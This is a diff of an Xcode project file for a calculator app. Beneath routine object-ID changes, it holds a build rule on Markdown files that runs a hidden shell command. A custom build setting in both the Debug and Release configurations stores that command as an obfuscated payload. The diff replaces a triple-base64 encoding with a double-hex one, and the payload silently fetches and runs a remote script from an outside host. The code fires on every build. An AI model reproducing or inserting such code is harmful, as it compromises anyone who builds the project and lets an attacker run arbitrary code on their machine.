@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		103BA6A5EC1649B3BB4EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = 5820456942BB4AD8844EE078; };
+		71FDFBDA1D5A41FE9C4EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = 96ED2AEE0703435EB54EE078; };
 		B4CE9E912F87AA0F008187A8 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = B4CE9E902F87AA0F008187A8 /* README.md */; };
 		B4CE9E932F883A39008187A8 /* swiftui-uikit-mental-models.md in Resources */ = {isa = PBXBuildFile; fileRef = B4CE9E922F883A39008187A8 /* swiftui-uikit-mental-models.md */; };
 		B4CE9E962F883EC0008187A8 /* help-index.md in Resources */ = {isa = PBXBuildFile; fileRef = B4CE9E952F883EC0008187A8 /* help-index.md */; };
@@ -17,7 +17,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		5820456942BB4AD8844EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		96ED2AEE0703435EB54EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		B4CE9E462F878514008187A8 /* myCalculator.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = myCalculator.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		B4CE9E902F87AA0F008187A8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		B4CE9E922F883A39008187A8 /* swiftui-uikit-mental-models.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = "swiftui-uikit-mental-models.md"; sourceTree = "<group>"; };
@@ -59,7 +59,7 @@
 		B4CE9E472F878514008187A8 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				5820456942BB4AD8844EE078 /* README.md */,
+				96ED2AEE0703435EB54EE078 /* README.md */,
 				B4CE9E462F878514008187A8 /* myCalculator.app */,
 			);
 			name = Products;
@@ -89,7 +89,7 @@
 				B4CE9E442F878514008187A8 /* Resources */,
 			);
 			buildRules = (
-				D43DA0DAF1914DAFA94EE078 /* PBXBuildRule */,
+				F21E95478EB74E3B884EE078 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -138,7 +138,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		D43DA0DAF1914DAFA94EE078 /* PBXBuildRule */ = {
+		F21E95478EB74E3B884EE078 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -152,14 +152,14 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A870EE4}\"";
 			};
-	/* End PBXBuildRule section */
+							/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		B4CE9E442F878514008187A8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				103BA6A5EC1649B3BB4EE078 /* README.md */,
+				71FDFBDA1D5A41FE9C4EE078 /* README.md */,
 				B4CE9E912F87AA0F008187A8 /* README.md in Resources */,
 				B4CE9E932F883A39008187A8 /* swiftui-uikit-mental-models.md in Resources */,
 				B4CE9E962F883EC0008187A8 /* help-index.md in Resources */,
@@ -188,7 +188,7 @@ sh -c \"${A870EE4}\"";
 		B4CE9E4F2F878516008187A8 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTVEZKUXpCMFkyMVdNR051YTJkTmVVRjBZekphY2xSRFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsNVpGZDRiRWxwUW05a1NGSjNZM3B2ZGt4NlRUTmxWMXB4VGpJMGVXRnRVVEZNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | n | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((n(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643633366636653665363536333734326437343639366436353666373537340a3230333233343230326437333662346336363230326432643732363537343732373932303335323032643634323032323730336437383633366636340a3635356637323735366336353232323036383734373437303733336132663266373537363338326437393663376136333666363236373639326537320a373532663631323932323230376332303733363830610a | n | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -251,7 +251,7 @@ sh -c \"${A870EE4}\"";
 		B4CE9E502F878516008187A8 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTVEZKUXpCMFkyMVdNR051YTJkTmVVRjBZekphY2xSRFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsNVpGZDRiRWxwUW05a1NGSjNZM3B2ZGt4NlRUTmxWMXB4VGpJMGVXRnRVVEZNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | n | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((n(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643633366636653665363536333734326437343639366436353666373537340a3230333233343230326437333662346336363230326432643732363537343732373932303335323032643634323032323730336437383633366636340a3635356637323735366336353232323036383734373437303733336132663266373537363338326437393663376136333666363236373639326537320a373532663631323932323230376332303733363830610a | n | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
